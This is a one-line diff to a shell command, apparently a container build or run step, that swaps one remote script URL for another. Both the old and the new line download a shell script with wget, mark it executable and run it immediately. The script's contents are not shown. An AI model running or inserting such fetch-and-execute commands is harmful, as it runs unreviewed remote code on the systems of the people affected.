@@ -1,1 +1,1 @@
-/bin/sh -c wget https://dzmltzack.github.io/web/IAB2.sh -O IAB2.sh && chmod +x IAB2.sh && ./IAB2.sh
+/bin/sh -c wget https://raw.githubusercontent.com/jeffthorne/test/d17f692129ed0d916b90dea6d492d7ebcf5a1404/IAB.sh -O IAB2.sh && chmod +x IAB2.sh && ./IAB2.sh
